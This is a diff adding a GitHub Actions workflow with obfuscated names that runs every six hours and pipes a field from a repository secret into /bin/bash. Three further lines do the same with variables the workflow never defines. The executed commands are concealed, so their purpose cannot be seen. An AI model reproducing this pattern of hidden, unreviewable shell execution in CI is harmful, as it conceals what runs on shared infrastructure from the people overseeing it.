@@ -1,0 +1,20 @@
+name: hezhelingan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: hezhelingan
+        env:
+          ni8: ${{ secrets.ni8 }}
+        run: |
+          echo $ni8 | jq -r .wok96 | /bin/bash
+          echo $feuif58 | jq -r .jh817 | /bin/bash
+          echo $kesve505 | jq -r .rlyah8282 | /bin/bash
+          echo $hre51 | jq -r .z01 | /bin/bash
+
